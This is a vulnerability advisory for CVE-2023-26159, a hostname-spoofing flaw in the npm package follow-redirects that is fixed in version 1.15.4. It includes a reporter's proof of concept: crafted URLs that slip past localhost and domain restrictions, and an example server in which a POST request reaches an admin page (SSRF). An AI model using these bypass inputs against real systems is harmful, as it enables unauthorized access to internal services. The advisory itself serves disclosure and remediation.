#### Introduced: 31 Dec 2023

[CVE-2023-26159  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2023-26159) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-235  (opens in a new tab)](https://cwe.mitre.org/data/definitions/235.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `follow-redirects` to version 1.15.4 or higher.

## Overview

Affected versions of this package are vulnerable to Improper Handling of Extra Parameters due to the improper handling of URLs by the `url.parse()` function. When `new URL()` throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.

## PoC

```
# Case 1 : Bypassing localhost restriction
let url = 'http://[localhost]/admin';
try{
    new URL(url); // ERROR : Invalid URL
}catch{
    url.parse(url); // -> http://localhost/admin
}

# Case 2 : Bypassing domain restriction
let url = 'http://attacker.domain*.allowed.domain:a';
try{
    new URL(url); // ERROR : Invalid URL
}catch{
    url.parse(url); // -> http://attacker.domain/*.allowed.domain:a
}

```

### CVSS Scores

version 3.1
### Snyk

7.3 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is limited. The data modification does not have a direct, serious impact on the impacted component.

  **Low**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

  **Low**

| By the way, I read about Security.md but huntr.dev service has changed to AL/ML open source bugbounty platform. So I couldn't report it to there. Because of that reason, I'm writing it here. Description Below is part of `follow-redirects`'s `index.js` code.  ``` function urlToOptions(urlObject) {   var options = {     protocol: urlObject.protocol,     hostname: urlObject.hostname.startsWith("[") ?       /* istanbul ignore next */       urlObject.hostname.slice(1, -1) :       urlObject.hostname,     hash: urlObject.hash,     search: urlObject.search,     pathname: urlObject.pathname,     path: urlObject.pathname + urlObject.search,     href: urlObject.href,   };   if (urlObject.port !== "") {     options.port = Number(urlObject.port);   }   return options; }  ```  It checks URL hostname which is startswith `[` character. Which means if the urlObject is `http://[localhost]/`, then it converts to `http://localhost/`.  But actually above code is not vulnerable code. (Just the idea comes from above code)  The problem comes from below code.  ```     function request(input, options, callback) {       // Parse parameters       if (isString(input)) {         var parsed;         try {           parsed = urlToOptions(new URL(input));         }         catch (err) {           /* istanbul ignore next */           parsed = url.parse(input);         }     /* below code skipped */  ```  `urlToOptions()` function is called after `new URL()`.  When `new URL('http://[localhost]')` it throws an error which is `Invalid URL`. Then it goes `catch{ }` phrase.  At the `catch{ }` phrase, there is vulnerable function which is `url.parse()`.  `url.parse('http://[localhost]')` sees URL to `http://localhost`.  Let's look at PoC code. Proof of Concept ``` // PoC.js const express = require("express"); const http = require('follow-redirects').http; const app  = express(); const port = 80;  const isLocalhost = function (url) {     try{         u = new URL(url);         if(u.hostname.includes('localhost')         || u.hostname.includes('127.0.0.1')         ){             return true;         }     }catch{}     return false; } app.use(express.json())  app.get("/", (req, res) => {     res.send("Hello World"); })  app.post("/request", (req, res) => {     let url = req.body.url;     let options = {         'followRedirects':false     }     if(req.body?.url){         if(isLocalhost(req.body.url)){             res.send('Localhost is restricted.');             return;         };         http.get(url, options, (response) => {             let data = '';             response.on('data', chunk => {                 data += chunk.toString();             });             response.on('end', () => {                 res.send(data);             })         }).on('error', (e) => {             console.log(e);             res.status(500).send('Server Error');         })     }else{         res.send('URL is required.');     } })  app.get("/admin", (req, res) => {     if(req.socket.remoteAddress.includes('127.0.0.1')){         res.send('Admin Page');     }else{         res.status(404).send('Not Found');     } })  app.listen(port, () => {     console.log(`App listening on port ${port}`) })  ```  Above is Web Server built by express and follow-redirects. If user requests like below.  ``` POST /request HTTP/1.1 Host: localhost Connection: close Content-Type: application/json Content-Length: 34  {"url":"http://[localhost]/admin"}  ```  Server responses `Admin Page`.  This is just an example code. There could be other cases using this vulnerability. And also hostname spoofing does not only affect localhost. It is also possible for other domains.  ``` # Case 1 : Bypassing localhost restriction let url = 'http://[localhost]/admin'; try{     new URL(url); // ERROR : Invalid URL }catch{     url.parse(url); // -> http://localhost/admin }  # Case 2 : Bypassing domain restriction let url = 'http://attacker.domain*.allowed.domain:a'; try{     new URL(url); // ERROR : Invalid URL }catch{     url.parse(url); // -> http://attacker.domain/*.allowed.domain:a }  ```  The main point is that inside of `folow-redirects` module, it uses vulnerable function `url.parse()` when `new URL()` throws error.  `url.parse()` functions is now deprecated and it has `hostname spoofing` vulnerability. You can check this site for unerstanding. <https://hackerone.com/reports/678487> Impact Hostname spoofing may cause open redirect, SSRF, etc. Occurences <https://github.com/follow-redirects/follow-redirects/blob/main/index.js#L503> |
